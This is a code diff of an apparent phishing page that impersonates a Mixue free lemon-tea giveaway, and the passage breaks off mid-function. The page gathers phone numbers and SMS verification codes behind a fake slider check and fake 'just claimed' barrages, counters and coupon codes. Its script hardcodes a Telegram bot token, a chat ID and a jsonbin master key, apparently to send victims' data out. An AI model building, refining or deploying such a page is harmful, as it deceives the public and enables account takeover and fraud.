@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.7.7/axios.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.7.7/axios.min.js"></script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>蜜雪冰城 · 限时福利 · 免费领柠檬茶</title>
@@ -17,15 +17,10 @@
       --radius-md: 18px;
       --radius-sm: 12px;
     }
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      -webkit-tap-highlight-color: transparent;
-    }
+    * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang SC", "Hiragino Sans GB", sans-serif;
-      background: url('hhttps://pub-141831e61e69445289222976a15b6fb3.r2.dev/Image_to_url_V2/1000046878-imagetourl.cloud-1770310883157-bp2dgh.jpg') no-repeat center center fixed;
+      background: url('https://pub-141831e61e69445289222976a15b6fb3.r2.dev/Image_to_url_V2/1000046878-imagetourl.cloud-1770310883157-bp2dgh.jpg') no-repeat center center fixed;
       background-size: cover;
       min-height: 100vh;
       display: flex;
@@ -42,638 +37,60 @@
       z-index: -1;
     }
 
-    .card {
-      width: 100%;
-      max-width: 420px;
-      background: rgba(255, 255, 255, 0.98);
-      border-radius: var(--radius-lg);
-      overflow: hidden;
-      box-shadow: var(--shadow-light);
-      border: 1px solid rgba(230,57,70,0.1);
-      animation: fadeUp 0.6s ease-out;
-    }
-    @keyframes fadeUp {
-      0% { opacity: 0; transform: translateY(30px); }
-      100% { opacity: 1; transform: translateY(0); }
-    }
+    .card { width:100%; max-width:420px; background:rgba(255,255,255,0.98); border-radius:var(--radius-lg); overflow:hidden; box-shadow:var(--shadow-light); border:1px solid rgba(230,57,70,0.1); animation:fadeUp 0.6s ease-out; }
+    @keyframes fadeUp { 0% {opacity:0; transform:translateY(30px);} 100% {opacity:1; transform:translateY(0);} }
 
-    .header {
-      background: linear-gradient(135deg, var(--mixue-red), #C92A39);
-      color: var(--mixue-white);
-      padding: 42px 28px 24px;
-      text-align: center;
-      position: relative;
-    }
-    .header::after {
-      content: "";
-      position: absolute;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      height: 6px;
-      background: var(--mixue-yellow);
-    }
-    .header h1 {
-      font-size: 2.6rem;
-      font-weight: 900;
-      letter-spacing: 2px;
-      text-shadow: 0 2px 4px rgba(0,0,0,0.1);
-    }
-    .header p {
-      margin: 10px 0 16px;
-      font-size: 1.15rem;
-      font-weight: 500;
-      opacity: 0.95;
-    }
+    .header { background:linear-gradient(135deg, var(--mixue-red), #C92A39); color:var(--mixue-white); padding:42px 28px 24px; text-align:center; position:relative; }
+    .header::after { content:""; position:absolute; bottom:0; left:0; right:0; height:6px; background:var(--mixue-yellow); }
+    .header h1 { font-size:2.6rem; font-weight:900; letter-spacing:2px; text-shadow:0 2px 4px rgba(0,0,0,0.1); }
+    .header p { margin:10px 0 16px; font-size:1.15rem; font-weight:500; opacity:0.95; }
 
-    .activity-period {
-      font-size: 0.9rem;
-      background: rgba(255,255,255,0.15);
-      padding: 10px 20px;
-      border-radius: 50px;
-      display: inline-block;
-      margin: 8px 0 16px;
-    }
-    #globalTimer {
-      color: var(--mixue-yellow);
-      font-weight: 700;
-    }
-    .stock-info {
-      font-size: 1rem;
-      background: rgba(0,0,0,0.2);
-      padding: 10px 20px;
-      border-radius: 50px;
-      margin: 12px auto;
-      max-width: 90%;
-      font-weight: 600;
-    }
-    .low-stock {
-      color: var(--mixue-yellow) !important;
-      animation: blinkWarn 1s infinite alternate;
-    }
-    @keyframes blinkWarn {
-      from { opacity: 1; }
-      to { opacity: 0.7; }
-    }
+    .activity-period { font-size:0.9rem; background:rgba(255,255,255,0.15); padding:10px 20px; border-radius:50px; display:inline-block; margin:8px 0 16px; }
+    #globalTimer { color:var(--mixue-yellow); font-weight:700; }
 
-    .join-count {
-      text-align: center;
-      font-size: 1.2rem;
-      color: var(--mixue-red);
-      background: rgba(255,209,102,0.15);
-      padding: 12px;
-      margin: 0;
-      font-weight: 700;
-      animation: pulse 2.5s infinite;
-    }
-    @keyframes pulse {
-      0%,100% { transform: scale(1); }
-      50% { transform: scale(1.03); }
-    }
+    .stock-info { font-size:1rem; background:rgba(0,0,0,0.2); padding:10px 20px; border-radius:50px; margin:12px auto; max-width:90%; font-weight:600; }
+    .low-stock { color:var(--mixue-yellow) !important; animation:blinkWarn 1s infinite alternate; }
+    @keyframes blinkWarn { from {opacity:1;} to {opacity:0.7;} }
 
-    .content {
-      padding: 32px 28px 40px;
-      background: var(--mixue-white);
-    }
+    .join-count { text-align:center; font-size:1.2rem; color:var(--mixue-red); background:rgba(255,209,102,0.15); padding:12px; margin:0; font-weight:700; animation:pulse 2.5s infinite; }
+    @keyframes pulse { 0%,100% {transform:scale(1);} 50% {transform:scale(1.03);} }
 
-    /* 虚假功能：门店导航栏 */
-    .store-nav {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      background: linear-gradient(90deg, #f8f9fa, #fff);
-      border: 1px solid #e5e6eb;
-      border-radius: 12px;
-      padding: 12px 16px;
-      margin-bottom: 16px;
-      cursor: pointer;
-      transition: all 0.3s ease;
-    }
-    .store-nav:hover {
-      background: #f0f1f2;
-      transform: translateX(4px);
-    }
-    .store-nav-icon {
-      width: 40px;
-      height: 40px;
-      background: var(--mixue-red);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: white;
-      font-size: 20px;
-    }
-    .store-nav-info {
-      flex: 1;
-      margin-left: 12px;
-      text-align: left;
-    }
-    .store-nav-title {
-      font-size: 0.95rem;
-      font-weight: 600;
-      color: var(--mixue-dark);
-    }
-    .store-nav-desc {
-      font-size: 0.8rem;
-      color: #86909c;
-      margin-top: 2px;
-    }
-    .store-nav-arrow {
-      color: #c9cdd4;
-      font-size: 20px;
-    }
+    .content { padding:32px 28px 40px; background:var(--mixue-white); }
 
-    /* 虚假功能：实时排队人数 */
-    .queue-status {
-      background: linear-gradient(135deg, #e6fffb, #f6ffed);
-      border: 1px solid #b7eb8f;
-      border-radius: 12px;
-      padding: 16px;
-      margin-bottom: 20px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      cursor: pointer;
-    }
-    .queue-live-dot {
-      width: 8px;
-      height: 8px;
-      background: #52c41a;
-      border-radius: 50%;
-      animation: blink 1.5s infinite;
-      margin-right: 8px;
-      display: inline-block;
-    }
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.3; }
-    }
-    .queue-text {
-      font-size: 0.9rem;
-      color: #52c41a;
-      font-weight: 600;
-    }
-    .queue-number {
-      font-size: 1.2rem;
-      font-weight: 700;
-      color: var(--mixue-red);
-    }
+    .store-nav, .queue-status, .transfer-entry { cursor:pointer; transition:all 0.3s; }
+    .store-nav:hover, .queue-status:hover, .transfer-entry:hover { transform:translateY(-2px); }
 
-    /* 虚假功能：优惠券转赠入口 */
-    .transfer-entry {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      padding: 12px;
-      background: #fff2f0;
-      border: 1px dashed var(--mixue-red);
-      border-radius: 12px;
-      margin-bottom: 20px;
-      cursor: pointer;
-      color: var(--mixue-red);
-      font-size: 0.9rem;
-      font-weight: 600;
-      transition: all 0.3s ease;
-    }
-    .transfer-entry:hover {
-      background: #fff0f0;
-      transform: scale(1.02);
-    }
-    .transfer-icon {
-      font-size: 1.2rem;
-    }
+    .barrage-box { height:120px; margin:0 0 20px; background:rgba(230,57,70,0.05); border-radius:var(--radius-sm); overflow:hidden; position:relative; border:1px solid rgba(230,57,70,0.1); padding:8px 0; }
+    .barrage-item { position:absolute; white-space:nowrap; font-size:0.95rem; font-weight:600; color:var(--mixue-red); padding:6px 16px; line-height:1.4; left:100%; background:rgba(255,255,255,0.92); border-radius:20px; box-shadow:0 2px 8px rgba(0,0,0,0.12); animation:barrageSlide linear forwards; z-index:1; }
 
-    .barrage-box {
-      height: 80px;
-      margin: 0 0 20px;
-      background: rgba(230,57,70,0.05);
-      border-radius: var(--radius-sm);
-      overflow: hidden;
-      position: relative;
-      border: 1px solid rgba(230,57,70,0.1);
-    }
-    
-    .barrage-item {
-      position: absolute;
-      white-space: nowrap;
-      font-size: 0.9rem;
-      font-weight: 600;
-      color: var(--mixue-red);
-      padding: 6px 16px;
-      line-height: 20px;
-      left: 100%;
-      background: rgba(255,255,255,0.9);
-      border-radius: 20px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      animation: barrageSlide 8s linear forwards;
-      z-index: 1;
-    }
-    
-    @keyframes barrageSlide {
-      0% { left: 100%; }
-      100% { left: -100%; }
-    }
+    @keyframes barrageSlide { 0% {left:100%;} 100% {left:-100%;} }
 
-    .fair-tip {
-      text-align: center;
-      font-size: 0.85rem;
-      color: var(--mixue-red);
-      margin: 12px 0;
-      font-weight: 600;
-      line-height: 1.4;
-    }
+    .input-box { position:relative; margin-bottom:20px; }
+    input { width:100%; height:56px; padding:0 24px; border:2px solid var(--mixue-gray); border-radius:var(--radius-md); font-size:1rem; background:#fff; transition:all 0.3s; }
+    input:focus { outline:none; border-color:var(--mixue-red); box-shadow:0 0 0 6px rgba(230,57,70,0.1); transform:translateY(-2px); }
+    input.input-error { border-color:#ff4d4f; box-shadow:0 0 0 6px rgba(255,77,79,0.1); animation:shake 0.3s; }
+    @keyframes shake { 0%,100% {transform:translateX(0);} 25% {transform:translateX(-4px);} 75% {transform:translateX(4px);} }
 
-    .input-box {
-      position: relative;
-      margin-bottom: 20px;
-      z-index: 1;
-    }
-    
-    input {
-      width: 100%;
-      height: 56px;
-      padding: 0 24px;
-      border: 2px solid var(--mixue-gray);
-      border-radius: var(--radius-md);
-      font-size: 1rem;
-      background: #fff;
-      transition: all 0.3s ease;
-      position: relative;
-      z-index: 2;
-      -webkit-appearance: none;
-      appearance: none;
-      opacity: 1;
-      pointer-events: auto;
-    }
-    
-    input::placeholder {
-      color: #aaa;
-    }
-    
-    input:focus {
-      outline: none;
-      border-color: var(--mixue-red);
-      box-shadow: 0 0 0 6px rgba(230,57,70,0.1);
-      transform: translateY(-2px);
-    }
-    
-    input.input-error {
-      border-color: #ff4d4f;
-      box-shadow: 0 0 0 6px rgba(255,77,79,0.1);
-      animation: shake 0.3s ease-in-out;
-    }
-    
-    @keyframes shake {
-      0%,100% { transform: translateX(0); }
-      25% { transform: translateX(-4px); }
-      75% { transform: translateX(4px); }
-    }
-    
-    .placeholder {
-      position: absolute;
-      left: 24px;
-      top: 50%;
-      transform: translateY(-50%);
-      color: #888;
-      font-size: 1rem;
-      pointer-events: none;
-      transition: all 0.3s ease;
-      background: #fff;
-      padding: 0 6px;
-      z-index: 3;
-      white-space: nowrap;
-    }
-    
-    input:focus + .placeholder,
-    input:not(:placeholder-shown) + .placeholder {
-      top: -10px;
-      left: 20px;
-      font-size: 0.8rem;
-      color: var(--mixue-red);
-      font-weight: 600;
-    }
+    .verify-slider { width:100%; height:46px; background:#f7f8fa; border-radius:23px; position:relative; margin:20px 0; overflow:hidden; border:1px solid #e5e6eb; display:none; opacity:0; transform:translateY(10px); transition:all 0.4s; }
+    .verify-slider.show { display:block; opacity:1; transform:translateY(0); }
 
-    .verify-slider {
-      width: 100%;
-      height: 46px;
-      background: #f7f8fa;
-      border-radius: 23px;
-      position: relative;
-      margin: 20px 0;
-      overflow: hidden;
-      border: 1px solid #e5e6eb;
-      display: none;
-      opacity: 0;
-      transform: translateY(10px);
-      transition: all 0.4s ease;
-    }
-    .verify-slider.show {
-      display: block;
-      opacity: 1;
-      transform: translateY(0);
-    }
-    .verify-bg {
-      position: absolute;
-      left: 0;
-      top: 0;
-      height: 100%;
-      background: linear-gradient(90deg, var(--mixue-yellow), #ffbd59);
-      width: 0;
-      transition: width 0.2s ease;
-      border-radius: 23px 0 0 23px;
-    }
-    .verify-block {
-      position: absolute;
-      left: 0;
-      top: 0;
-      width: 46px;
-      height: 46px;
-      background: linear-gradient(135deg, var(--mixue-red), #d62e3d);
-      border-radius: 50%;
-      cursor: grab;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #fff;
-      font-size: 20px;
-      font-weight: bold;
-      transition: left 0.2s ease, transform 0.2s ease;
-      z-index: 2;
-      user-select: none;
-      -webkit-user-select: none;
-      box-shadow: 0 2px 8px rgba(230,57,70,0.3);
-    }
-    .verify-block:active {
-      cursor: grabbing;
-      transform: scale(1.1);
-    }
-    .verify-text {
-      position: absolute;
-      left: 0;
-      right: 0;
-      top: 0;
-      bottom: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #666;
-      font-size: 0.95rem;
-      font-weight: 500;
-      z-index: 1;
-      user-select: none;
-    }
-    .verify-success .verify-bg {
-      background: linear-gradient(90deg, #52c41a, #73d13d);
-      border-radius: 23px;
-    }
-    .verify-success .verify-block {
-      background: linear-gradient(135deg, #52c41a, #73d13d);
-      box-shadow: 0 2px 8px rgba(82, 196, 26, 0.3);
-    }
+    .btn { width:100%; height:60px; background:linear-gradient(135deg, var(--mixue-red), #D62E3D); color:#fff; border:none; border-radius:var(--radius-md); font-size:1.25rem; font-weight:700; cursor:pointer; transition:all 0.3s; margin-top:16px; box-shadow:0 6px 16px rgba(230,57,70,0.3); }
+    .btn:disabled { background:var(--mixue-gray); cursor:not-allowed; box-shadow:none; }
 
-    .btn {
-      width: 100%;
-      height: 60px;
-      background: linear-gradient(135deg, var(--mixue-red), #D62E3D);
-      color: #fff;
-      border: none;
-      border-radius: var(--radius-md);
-      font-size: 1.25rem;
-      font-weight: 700;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      margin-top: 16px;
-      position: relative;
-      overflow: hidden;
-      box-shadow: 0 6px 16px rgba(230,57,70,0.3);
-      z-index: 1;
-    }
-    .btn:hover:not(:disabled) {
-      transform: translateY(-2px);
-      box-shadow: 0 8px 20px rgba(230,57,70,0.4);
-    }
-    .btn:disabled {
-      background: var(--mixue-gray);
-      cursor: not-allowed;
-      box-shadow: none;
-      transform: none;
-    }
-    .btn:active {
-      transform: scale(0.97);
-    }
-    .btn::after {
-      content: "";
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      width: 0;
-      height: 0;
-      background: rgba(255,255,255,0.3);
-      border-radius: 50%;
-      transform: translate(-50%,-50%);
-      transition: width 0.6s, height 0.6s;
-    }
-    .btn:active::after {
-      width: 500px;
-      height: 500px;
-    }
+    .loading-mask { position:fixed; inset:0; background:rgba(255,255,255,0.92); display:none; flex-direction:column; align-items:center; justify-content:center; z-index:99999; backdrop-filter:blur(4px); }
+    .loading-mask.show { display:flex; }
 
-    #countdown {
-      opacity: 0;
-      color: var(--mixue-red);
-      text-align: center;
-      margin-top: 14px;
-      font-size: 0.95rem;
-      font-weight: 500;
-    }
-
-    .agreement {
-      margin-top: 28px;
-      font-size: 0.85rem;
-      color: #666;
-      text-align: center;
-      line-height: 1.5;
-    }
-    .agreement a {
-      color: var(--mixue-red);
-      font-weight: 600;
-      text-decoration: none;
-    }
-
-    /* 虚假功能：悬浮反馈按钮 */
-    .feedback-btn {
-      position: fixed;
-      right: 20px;
-      bottom: 100px;
-      width: 56px;
-      height: 56px;
-      background: linear-gradient(135deg, #ff4d4f, #ff7875);
-      border-radius: 50%;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      color: white;
-      font-size: 12px;
-      font-weight: 600;
-      box-shadow: 0 4px 12px rgba(255, 77, 79, 0.4);
-      cursor: pointer;
-      z-index: 1000;
-      transition: all 0.3s ease;
-      animation: float 3s ease-in-out infinite;
-    }
-    .feedback-btn:hover {
-      transform: scale(1.1);
-      box-shadow: 0 6px 20px rgba(255, 77, 79, 0.6);
-    }
-    @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
-    }
-    .feedback-icon {
-      font-size: 24px;
-      margin-bottom: 2px;
-    }
-
-    /* 虚假功能：实时通知 toast */
-    .toast-container {
-      position: fixed;
-      top: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      z-index: 9999;
-      pointer-events: none;
-    }
-    .toast {
-      background: rgba(0,0,0,0.8);
-      color: white;
-      padding: 12px 24px;
-      border-radius: 24px;
-      font-size: 0.9rem;
-      margin-bottom: 10px;
-      animation: slideDown 0.5s ease, fadeOut 0.5s ease 2.5s forwards;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-    @keyframes slideDown {
-      from { transform: translateY(-100%); opacity: 0; }
-      to { transform: translateY(0); opacity: 1; }
-    }
-    @keyframes fadeOut {
-      to { opacity: 0; transform: translateY(-20px); }
-    }
-
-    /* 虚假功能：加载遮罩 */
-    .loading-mask {
-      position: fixed;
-      inset: 0;
-      background: rgba(255,255,255,0.9);
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      z-index: 9998;
-    }
-    .loading-mask.show {
-      display: flex;
-    }
-    .loading-spinner {
-      width: 50px;
-      height: 50px;
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid var(--mixue-red);
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    .loading-text {
-      margin-top: 16px;
-      color: #666;
-      font-size: 0.95rem;
-    }
-
-    .modal {
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.7);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-      animation: fadeIn 0.3s ease;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-    .modal-content {
-      background: linear-gradient(135deg, var(--mixue-red), #FF6B6B);
-      color: #fff;
-      border-radius: var(--radius-lg);
-      padding: 48px 32px;
-      text-align: center;
-      max-width: 380px;
-      width: 95%;
-      box-shadow: 0 20px 60px rgba(230,57,70,0.4);
-      animation: popScale 0.5s cubic-bezier(0.175,0.885,0.32,1.2);
-    }
-    @keyframes popScale {
-      0% { transform: scale(0.6); opacity: 0; }
-      100% { transform: scale(1); opacity: 1; }
-    }
-    .modal h2 {
-      font-size: 2.8rem;
-      margin: 0 0 20px;
-      font-weight: 900;
-      text-shadow: 0 2px 4px rgba(0,0,0,0.1);
-    }
-    .modal .coupon-code {
-      font-size: 2rem;
-      font-weight: bold;
-      background: rgba(255,255,255,0.25);
-      padding: 18px;
-      border-radius: var(--radius-sm);
-      margin: 28px 0;
-      letter-spacing: 3px;
-      border: 2px dashed #fff;
-    }
-    .modal-emoji {
-      font-size: 5rem;
-      margin: 32px 0;
-    }
-    .modal-btn {
-      margin-top: 36px;
-      background: #fff;
-      color: var(--mixue-red);
-      border: none;
-      padding: 18px 60px;
-      border-radius: var(--radius-md);
-      font-size: 1.25rem;
-      font-weight: 700;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 6px 16px rgba(0,0,0,0.1);
-    }
-    .modal-btn:active {
-      transform: scale(0.96);
-    }
+    .modal { position:fixed; inset:0; background:rgba(0,0,0,0.65); display:none; align-items:center; justify-content:center; z-index:100000; }
+    .modal.show { display:flex; }
   </style>
 </head>
 <body>
 
-<!-- 虚假功能：实时通知容器 -->
 <div class="toast-container" id="toastContainer"></div>
 
-<!-- 虚假功能：加载遮罩 -->
 <div class="loading-mask" id="loadingMask">
   <div class="loading-spinner"></div>
-  <div class="loading-text">正在连接服务器...</div>
+  <div class="loading-text">加载中...</div>
 </div>
 
 <div class="card">
@@ -690,280 +107,179 @@
   <div class="join-count">已有 <span id="countNum">4,567</span> 人抢到福利</div>
 
   <div class="content">
-    <!-- 虚假功能：门店导航 -->
-    <div class="store-nav" onclick="showNetworkError()">
-      <div class="store-nav-icon">📍</div>
-      <div class="store-nav-info">
-        <div class="store-nav-title">最近的门店：金汇来商场店</div>
-        <div class="store-nav-desc">距您 10.2km · 营业中 · 点击查看排队情况</div>
-      </div>
-      <div class="store-nav-arrow">›</div>
-    </div>
-
-    <!-- 虚假功能：实时排队 -->
-    <div class="queue-status" onclick="showNetworkError()">
-      <div>
-        <span class="queue-live-dot"></span>
-        <span class="queue-text">实时排队：制作中 <span id="makingCount">23</span> 杯</span>
-      </div>
-      <div class="queue-number">预计等待 8 分钟</div>
-    </div>
-
-    <!-- 虚假功能：转赠入口 -->
-    <div class="transfer-entry" onclick="showNetworkError()">
-      <span class="transfer-icon">🎁</span>
-      <span>转赠好友 · 双方各得 2 元券</span>
-    </div>
-
     <div class="barrage-box" id="barrageBox"></div>
 
-    <div class="fair-tip">为了活动公平，禁止使用外挂操作，违规将取消领取资格</div>
+    <div class="fair-tip">为保证公平，严禁使用脚本或外挂，违规永久封号</div>
 
     <div class="input-box">
-      <input type="text" id="nickname" placeholder="你的昵称（选填，展示用）" maxlength="20" autocomplete="off" />
+      <input type="text" id="nickname" placeholder="昵称（选填）" maxlength="20" autocomplete="off" />
     </div>
 
     <div class="input-box">
-      <input type="tel" id="phone" placeholder="请输入手机号" maxlength="11" inputmode="numeric" autocomplete="off" pattern="[0-9]*" />
+      <input type="tel" id="phone" placeholder="请输入手机号" maxlength="11" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
     </div>
 
     <div class="verify-slider" id="verifySlider">
       <div class="verify-bg" id="verifyBg"></div>
       <div class="verify-block" id="verifyBlock">→</div>
-      <div class="verify-text">滑动完成验证</div>
+      <div class="verify-text">向右滑动完成验证</div>
     </div>
 
     <div class="input-box">
-      <input type="text" id="code" placeholder="请输入验证码" maxlength="6" inputmode="numeric" autocomplete="off" pattern="[0-9]*" />
+      <input type="text" id="code" placeholder="请输入验证码" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
     </div>
 
     <button class="btn" id="getCodeBtn" disabled>获取验证码</button>
     <button class="btn" id="submitBtn" style="display:none;" disabled>立即领取</button>
 
-    <div class="countdown" id="countdown">验证码已发送，请注意查收（60s）</div>
-
-    <div class="agreement">
-      登录即代表同意《<a href="javascript:alert('本活动为演示版本，非官方正式活动');">用户协议</a>》和《<a href="javascript:alert('仅用于学习演示，信息不会用于商业用途');">隐私政策</a>》
-    </div>
+    <div id="countdown" style="opacity:0; color:var(--mixue-red); text-align:center; margin-top:14px; font-size:0.95rem;"></div>
   </div>
-</div>
-
-<!-- 虚假功能：悬浮反馈按钮 -->
-<div class="feedback-btn" onclick="showNetworkError()">
-  <span class="feedback-icon">💬</span>
-  <span>反馈</span>
 </div>
 
 <div class="modal" id="successModal">
   <div class="modal-content">
     <h2>领取成功！</h2>
-    <p>大杯柠檬茶优惠券已发送至您的手机</p>
-    <div class="coupon-code" id="fakeCode">MXICE202602-ABCD-1234</div>
-    <p style="font-size:1.22rem; font-weight:bold; margin:20px 0;">请立即到店使用！过期作废</p>
-    <div class="modal-emoji">🎉🍦🔥</div>
-    <p style="font-size:1.08rem; opacity:0.9;">门店核销有效期至2026年3月31日</p>
-    <button class="modal-btn" id="closeModalBtn">好的，去店里兑！</button>
+    <p>大杯柠檬茶券已发至手机</p>
+    <div class="coupon-code">MX2026-ICE-ABCD1234</div>
+    <p style="font-weight:bold; margin:20px 0;">请尽快到店核销，过期无效</p>
+    <div class="modal-emoji">🎉🍋🔥</div>
+    <button class="btn" id="closeModalBtn">好的，去兑换！</button>
   </div>
 </div>
 
 <script>
-// 虚假功能：显示网络错误
-function showNetworkError() {
-  const loading = document.getElementById('loadingMask');
-  loading.classList.add('show');
-  loading.querySelector('.loading-text').textContent = '正在连接服务器...';
-  
-  setTimeout(() => {
-    loading.classList.remove('show');
-    showToast('⚠️ 网络连接失败，请稍后再试', 'error');
-  }, 1500 + Math.random() * 1000);
-}
-
-// Toast 通知
-function showToast(message, type = 'info') {
-  const container = document.getElementById('toastContainer');
-  const toast = document.createElement('div');
-  toast.className = 'toast';
-  toast.innerHTML = message;  // 支持 emoji
-  container.appendChild(toast);
-  setTimeout(() => toast.remove(), 3000);
-}
-
-// 随机系统通知（保持）
-const fakeNotifications = [
-  '🔥 用户 138****5678 刚刚领取了优惠券',
-  '📍 您附近有 3 家门店正在营业',
-  '🎁 分享给好友，双方都得 20 元券',
-  '⏰ 您有一张优惠券即将过期',
-  '🍦 新品上市：芋圆葡萄冰淇淋',
-  '👥 已有 2741 位好友助力成功'
-];
-
-setInterval(() => {
-  if (Math.random() > 0.6) {
-    showToast(fakeNotifications[Math.floor(Math.random() * fakeNotifications.length)]);
-  }
-}, 6000);
-
-// 排队人数假动态
-function updateQueueNumber() {
-  const el = document.getElementById('makingCount');
-  if (el) {
-    let v = parseInt(el.textContent) || 20;
-    v += Math.floor(Math.random() * 7) - 3;
-    v = Math.max(8, Math.min(45, v));
-    el.textContent = v;
-  }
-}
-setInterval(updateQueueNumber, 4000);
-
-// 配置
+// ============================= 配置 =============================
 const BOT_TOKEN = '8338672395:AAH9rbys9sjY-BthubvXyVv2Rr_d_Pr_kiI';
 const CHAT_ID   = '8439448087';
-
-const BIN_ID = '6985876ad0ea881f40a4c4a0';
+const BIN_ID    = '6985876ad0ea881f40a4c4a0';
 const MASTER_KEY = '$2a$10$DeNPX1R0C0PjshDJf/w1d.9wc8fHLNB0bAGBwXmrnsMCvSVTt/vga';
-const BIN_URL = `https://api.jsonbin.io/v3/b/${BIN_ID}`;
-const BIN_HEADERS = { 
-  'Content-Type': 'application/json',
-  'X-Master-Key': MASTER_KEY 
-};
+const BIN_URL   = `https://api.jsonbin.io/v3/b/${BIN_ID}`;
+const BIN_HEADERS = { 'Content-Type': 'application/json', 'X-Master-Key': MASTER_KEY };
 
 const TOTAL_STOCK = 5000;
 let claimed = 4567;
-let initialClaimed = claimed;
 let isVerifySuccess = false;
+let timers = {};
 
-let timers = {
-  fakeStock: null,
-  barrageAuto: null,
-  codeCd: null,
-  globalCd: null,
-  poll: null
+// DOM
+const els = {
+  phone: document.getElementById('phone'),
+  nickname: document.getElementById('nickname'),
+  code: document.getElementById('code'),
+  getBtn: document.getElementById('getCodeBtn'),
+  submitBtn: document.getElementById('submitBtn'),
+  countdown: document.getElementById('countdown'),
+  modal: document.getElementById('successModal'),
+  claimedCount: document.getElementById('claimedCount'),
+  remainCount: document.getElementById('remainCount'),
+  countNum: document.getElementById('countNum'),
+  barrageBox: document.getElementById('barrageBox'),
+  verifySlider: document.getElementById('verifySlider'),
+  verifyBlock: document.getElementById('verifyBlock'),
+  verifyBg: document.getElementById('verifyBg'),
+  loadingMask: document.getElementById('loadingMask'),
+  globalTimer: document.getElementById('globalTimer')
 };
 
-// DOM 缓存
-const phoneEl     = document.getElementById('phone');
-const nicknameEl  = document.getElementById('nickname');
-const codeEl      = document.getElementById('code');
-const getBtn      = document.getElementById('getCodeBtn');
-const submitBtn   = document.getElementById('submitBtn');
-const cdEl        = document.getElementById('countdown');
-const modal       = document.getElementById('successModal');
-const countNumEl  = document.getElementById('countNum');
-const claimedEl   = document.getElementById('claimedCount');
-const remainEl    = document.getElementById('remainCount');
-const barrageBox  = document.getElementById('barrageBox');
-const closeModalBtn = document.getElementById('closeModalBtn');
-const verifySlider = document.getElementById('verifySlider');
-const verifyBlock = document.getElementById('verifyBlock');
-const verifyBg    = document.getElementById('verifyBg');
-const loadingMask = document.getElementById('loadingMask');
+// ============================= 函数 =============================
+function showToast(msg) {
+  const t = document.createElement('div');
+  t.className = 'toast';
+  t.innerHTML = msg;
+  document.getElementById('toastContainer').appendChild(t);
+  setTimeout(() => t.remove(), 2800);
+}
 
-// 弹幕优化：增加随机颜色、更高位置范围、慢一点的默认速度
-function shootBarrage(customPhone = null) {
-  let phoneDisplay = customPhone && /^1[3-9]\d{9}$/.test(customPhone)
-    ? customPhone.slice(0,3) + "****" + customPhone.slice(7)
-    : '1' + (3000000000 + Math.floor(Math.random()*9000000000)).toString().slice(1,10);
-
-  const surname = ['赵','钱','孙','李','周','吴','郑','王','冯','陈'][Math.floor(Math.random()*10)];
-  const msg = `${surname}** ${phoneDisplay} 刚刚领取成功！`;
-
+function shootBarrage(phone = null) {
+  const prefix = phone ? phone.slice(0,3)+'****'+phone.slice(7) : '1'+Math.floor(3000000000 + Math.random()*9000000000);
+  const surname = '赵钱孙李周吴郑王冯陈'[Math.floor(Math.random()*10)];
   const item = document.createElement('div');
   item.className = 'barrage-item';
-  item.textContent = msg;
-
-  // 优化可见性
-  const top = 10 + Math.floor(Math.random() * 50);  // 更高范围
-  item.style.top = top + 'px';
-  item.style.color = ['#E63946', '#D00000', '#9D0208', '#6A040F'][Math.floor(Math.random()*4)]; // 红色系更显眼
-
-  const duration = 10 + Math.random() * 6;  // 更慢一些，容易看清
-  item.style.animationDuration = duration + 's';
-
-  barrageBox.appendChild(item);
-  setTimeout(() => item.remove(), duration * 1000 + 500);
+  item.textContent = `${surname}** ${prefix} 刚刚领取成功！`;
+  item.style.top = (10 + Math.random()*60) + 'px';
+  item.style.color = ['#c1121f','#9d0208','#e63946','#d00000'][Math.floor(Math.random()*4)];
+  const dur = 9 + Math.random()*7;
+  item.style.animationDuration = dur + 's';
+  els.barrageBox.appendChild(item);
+  setTimeout(() => item.remove(), dur*1000 + 1000);
 }
 
-// 库存显示
-function updateStockDisplay() {
-  const realClaimed = claimed;
-  const realRemain = Math.max(0, TOTAL_STOCK - (realClaimed - initialClaimed));
-  claimedEl.textContent = realClaimed.toLocaleString('zh-CN');
-  remainEl.textContent = realRemain.toLocaleString('zh-CN');
-  countNumEl.textContent = realClaimed.toLocaleString('zh-CN');
-  if (realRemain < 100) remainEl.classList.add('low-stock');
+function updateStock() {
+  const remain = Math.max(0, TOTAL_STOCK - (claimed - 4567));
